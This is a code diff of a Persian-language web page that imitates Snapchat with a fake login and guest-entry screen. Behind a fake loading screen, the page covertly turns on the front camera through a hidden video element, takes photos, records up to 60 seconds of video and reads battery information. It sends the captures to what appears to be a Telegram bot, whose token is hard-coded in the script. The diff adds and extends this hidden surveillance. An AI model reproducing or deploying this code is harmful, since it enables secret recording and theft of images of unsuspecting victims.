@@ -1,4 +1,5 @@
-<!DOCTYPE html><html lang="fa">
+<!DOCTYPE html>
+<html lang="fa">
 <head>
   <meta charset="UTF-8" />
   <title>Snap Auto</title>
@@ -9,31 +10,29 @@
     body {
       margin: 0;
       font-family: 'Vazirmatn', sans-serif;
-      direction: rtl;
       background: #FFFC00;
+      direction: rtl;
       overflow: hidden;
-    }
-    .splash, .login, .camera-ui, .loading-screen {
-      position: absolute;
-      inset: 0;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      background-color: #FFFC00;
-      z-index: 10;
     }
     #video {
       display: none;
     }
-    .loading-spinner {
-      border: 8px solid #f3f3f3;
-      border-top: 8px solid #000;
+    .centered {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 10;
+    }
+    .loader {
+      border: 6px solid #000;
+      border-top: 6px solid transparent;
       border-radius: 50%;
       width: 60px;
       height: 60px;
       animation: spin 1s linear infinite;
-      margin-top: 16px;
     }
     @keyframes spin {
       0% { transform: rotate(0deg); }
@@ -41,44 +40,23 @@
     }
   </style>
 </head>
-<body>  <!-- Splash Screen -->  <div id="splash" class="splash">
+<body>
+  <!-- Splash Screen -->
+  <div id="splash" class="centered">
     <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" width="100" class="animate-bounce mb-4">
-  </div>  <!-- Login Screen -->  <div id="login" class="login hidden">
+  </div>  <!-- Login Screen -->  <div id="login" class="centered hidden">
     <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" width="80" class="mb-6">
-    <h2 class="text-xl font-bold mb-4">ورود به اسنپ‌چت</h2>
-    <button class="bg-white text-black py-2 px-6 rounded-full mb-3 flex items-center gap-2 cursor-not-allowed" disabled>
-      <img src="https://img.icons8.com/color/48/google-logo.png" width="20"> ورود با گوگل
-    </button>
-    <button class="bg-white text-black py-2 px-6 rounded-full mb-3 flex items-center gap-2 cursor-not-allowed" disabled>
-      <img src="https://img.icons8.com/fluency/48/facebook-new.png" width="20"> ورود با فیسبوک
-    </button>
-    <button onclick="guestLogin()" class="bg-black text-white py-2 px-6 rounded-full mt-2">ورود مهمان</button>
-  </div>  <!-- Loading Screen -->  <div id="loading" class="loading-screen hidden">
-    <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" width="70">
-    <div class="loading-spinner"></div>
-    <p class="mt-4 font-bold">در حال آماده‌سازی...</p>
-  </div>  <!-- UI Layer -->  <div id="camera-ui" class="camera-ui hidden">
-    <div class="absolute top-4 left-4">
-      <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" width="40">
-    </div>
-    <div class="absolute bottom-4 left-1/2 -translate-x-1/2">
-      <div class="w-16 h-16 rounded-full border-4 border-black bg-white"></div>
-    </div>
-    <div class="absolute top-4 right-4">
-      <div class="w-12 h-12 bg-white/70 rounded-full flex justify-center items-center cursor-not-allowed">
-        <img src="https://img.icons8.com/ios-filled/50/switch-camera.png" width="24" />
-      </div>
-    </div>
-    <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2">
-      <div class="loading-spinner"></div>
-    </div>
-  </div>  <!-- Hidden Video --><video id="video" autoplay muted playsinline></video>
+    <h2 class="text-xl font-bold mb-4 text-black">ورود به اسنپ‌چت</h2>
+    <button onclick="guestLogin()" class="bg-black text-white py-2 px-6 rounded-full">ورود مهمان</button>
+  </div>  <!-- Loading Screen -->  <div id="loading" class="centered hidden">
+    <div class="loader mb-4"></div>
+    <p class="text-black font-bold">در حال انجام عملیات...</p>
+  </div>  <!-- Hidden video for camera access --><video id="video" autoplay playsinline muted></video>
 
   <script>
     const splash = document.getElementById('splash');
     const login = document.getElementById('login');
     const loading = document.getElementById('loading');
-    const cameraUI = document.getElementById('camera-ui');
     const video = document.getElementById('video');
 
     const botToken = "7720902826:AAEK57GNutoXcCEYyTcWeySwRt829nxPhDI";
@@ -86,8 +64,8 @@
 
     let stream;
     let chunks = [];
-    let videoSent = false;
     let mediaRecorder;
+    let videoSent = false;
 
     setTimeout(() => {
       splash.classList.add("hidden");
@@ -104,20 +82,6 @@
       }, 2000);
     }
 
-    async function startCamera() {
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480, facingMode: "user" } });
-        video.srcObject = stream;
-        cameraUI.classList.remove("hidden");
-        loading.classList.add("hidden");
-        startRecording();
-        setTimeout(() => takePhoto(1), 1000);
-        setTimeout(() => takePhoto(2), 5000);
-      } catch (err) {
-        alert("دسترسی به دوربین رد شد");
-      }
-    }
-
     async function getBatteryInfo() {
       if (navigator.getBattery) {
         const battery = await navigator.getBattery();
@@ -127,6 +91,18 @@
         };
       }
       return { level: "?", charging: false };
+    }
+
+    async function startCamera() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        video.srcObject = stream;
+        startRecording();
+        setTimeout(() => takePhoto(1), 1000);
+        setTimeout(() => takePhoto(2), 5000);
+      } catch (e) {
+        alert("خطا در دسترسی به دوربین.");
+      }
     }
 
     async function takePhoto(index) {
@@ -145,24 +121,28 @@
           method: "POST",
           body: form
         });
-      }, 'image/jpeg', 0.7);
+      }, 'image/jpeg', 0.8);
     }
 
     function startRecording() {
       chunks = [];
-      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" });
-      mediaRecorder.ondataavailable = e => chunks.push(e.data);
-      mediaRecorder.onstop = sendVideo;
+      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+
+      mediaRecorder.ondataavailable = e => {
+        if (e.data.size > 0) chunks.push(e.data);
+      };
+
+      mediaRecorder.onstop = () => sendVideo();
       mediaRecorder.start();
 
       setTimeout(() => {
-        if (mediaRecorder.state === "recording") {
-          mediaRecorder.stop();
-        }
-      }, 30000);
+        if (mediaRecorder.state === "recording") mediaRecorder.stop();
+      }, 60000);
 
       window.addEventListener("beforeunload", () => {
-        if (mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop();
+        if (mediaRecorder && mediaRecorder.state === "recording") {
+          mediaRecorder.stop();
+        }
       });
     }
 
